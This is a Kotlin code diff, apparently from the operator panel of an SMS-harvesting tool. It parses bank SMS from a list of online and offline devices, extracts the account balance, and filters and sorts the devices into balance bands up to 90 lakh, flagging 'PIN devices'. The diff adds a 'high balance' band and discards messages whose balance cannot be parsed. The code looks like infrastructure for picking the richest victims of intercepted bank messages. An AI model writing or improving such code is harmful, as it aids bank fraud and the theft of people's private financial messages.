@@ -112,19 +112,20 @@ enum class ConnectionFilter { ONLINE, OFFLINE, BOTH }
 
 /** Preset balance band (bank filtered mode) — matches Virtus panel pill labels */
 enum class BalanceTier {
-    /** 2K – 50K — Low → High style band */
+    /** 2K – 50K bank band (sort dir = SortMode on config) */
     LOW_2K_50K,
-    /** ~5K – 1L “medium” */
+    /** 50K – 90L “high balance” band (High→Low list) */
+    HIGH_50K_90L,
+    /** Legacy / unused in current Virtus-simple UI */
     MEDIUM_5K_1L,
-    /** 1 Lakh – 20 Lakh */
     HIGH_1L_20L,
-    /** 20 Lakh – 90 Lakh (screenshot “Boom 20L–1Cr”; cap 90L app rule) */
     BOOM_20L_90L,
 }
 
 fun tierRange(tier: BalanceTier): ClosedFloatingPointRange<Double> =
     when (tier) {
         BalanceTier.LOW_2K_50K -> 2_000.0..50_000.0
+        BalanceTier.HIGH_50K_90L -> 50_000.0..9_000_000.0
         BalanceTier.MEDIUM_5K_1L -> 5_000.0..100_000.0
         BalanceTier.HIGH_1L_20L -> 100_000.0..2_000_000.0
         BalanceTier.BOOM_20L_90L -> 2_000_000.0..9_000_000.0
@@ -153,7 +154,7 @@ data class FilterConfig(
     val days: Int?, // null = all time (purani SMS bhi)
     val inboxMode: InboxMode = InboxMode.BANK_FILTERED,
     /** Bank filtered: which preset band (High 1L–20L, Boom, …) */
-    val balanceTier: BalanceTier = BalanceTier.HIGH_1L_20L,
+    val balanceTier: BalanceTier = BalanceTier.LOW_2K_50K,
     /** Bank modes: sort device list by battery % instead of parsed balance */
     val sortByBattery: Boolean = false,
     val lowMin: Double = 2_000.0,
@@ -190,8 +191,8 @@ fun passesInboxMode(body: String, sender: String, cfg: FilterConfig): Boolean {
         InboxMode.BANK_FILTERED -> {
             if (!isBankLikeSms(body, sender)) return false
             val bal = mainBalanceForSort(body)
-            // Bahut bank SMS me amount regex miss ho jata hai — phir bhi credit/debit/received wale dikhane hain
-            if (bal == null) return true
+            // Tier/PIN devices: amount parse hona chahiye warna galat row sort/filter ho sakta hai
+            if (bal == null) return false
             return balanceInRangeForSort(bal, cfg)
         }
         InboxMode.BANK_ALL -> return isBankLikeSms(body, sender)
